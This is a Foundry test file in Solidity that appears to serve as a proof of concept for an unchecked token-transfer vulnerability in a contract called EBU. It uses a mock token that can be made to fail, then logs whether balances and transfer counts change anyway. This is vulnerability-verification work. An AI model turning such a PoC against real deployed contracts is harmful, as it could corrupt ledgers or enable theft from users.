// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol";

// Mock token with controllable failure - defined at top level
contract MockToken {
    bool public shouldFail;

    function setShouldFail(bool _shouldFail) external {
        shouldFail = _shouldFail;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        return !shouldFail; // Pass when shouldFail=false, fail when shouldFail=true
    }
}

contract UncheckedCallTest is Test {
    EBU public ebu;
    MockToken public token;
    address public owner;
    
    function setUp() public {
        owner = makeAddr("owner");
        vm.startPrank(owner);
        
        // Deploy contracts
        ebu = new EBU();
        token = new MockToken();
        
        // Authorize our mock token
        ebu.authorizeToken(address(token));
        
        vm.stopPrank();
    }

    function testUncheckedCallVulnerability() public {
        address sender = makeAddr("sender");
        address recipient = makeAddr("recipient");
        address[] memory recipients = new address[](1);
        recipients[0] = recipient;
        uint[] memory amounts = new uint[](1);
        amounts[0] = 100 ether;
        
        console2.log("--- BEFORE-Trigger state ---");
        uint initialBalance = ebu.getUserBalance(recipient);
        uint initialTotalTransfers = ebu.totalTransfers();
        console2.log("Initial recipient balance:", initialBalance);
        console2.log("Initial total transfers count:", initialTotalTransfers);

        // Enable failures in mock token
        token.setShouldFail(true);
        
        console2.log("--- Trigger: transfer (expected token failure) ---");
        // Perform transfer - will fail at token level but may process in EBU contract
        ebu.transfer(sender, address(token), recipients, amounts);
        
        console2.log("--- AFTER-Trigger state ---");
        uint finalBalance = ebu.getUserBalance(recipient);
        uint finalTotalTransfers = ebu.totalTransfers();
        console2.log("Final recipient balance:", finalBalance);
        console2.log("Final total transfers count:", finalTotalTransfers);
        
        console2.log("--- State Comparison ---");
        uint balanceDiff = finalBalance - initialBalance;
        uint transferCountDiff = finalTotalTransfers - initialTotalTransfers;
        console2.log("Recipient balance change:", balanceDiff);
        console2.log("Transfer count change:", transferCountDiff);
        
        // Vulnerability verification
        bool balanceChanged = balanceDiff != 0;
        bool transfersChanged = transferCountDiff != 0;
        bool vulnerabilityExists = balanceChanged || transfersChanged;
        
        string memory reason = vulnerabilityExists
            ? "State changed despite failed token transfer"
            : "State unchanged after token transfer failure";
            
        if (vulnerabilityExists) {
            console2.log("VULNERABILITY CONFIRMED:", reason);
            if (balanceChanged) console2.log("- Recipient balance unexpectedly changed");
            if (transfersChanged) console2.log("- Transfer count unexpectedly changed");
        } else {
            console2.log("VULNERABILITY NOT DETECTED:", reason);
        }
        
        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: EBU contract state updated despite failed token transfer");
        } else {
            console2.log("Vulnerability not Exist: Failed token transfer didn't modify EBU contract state");
        }
    }
}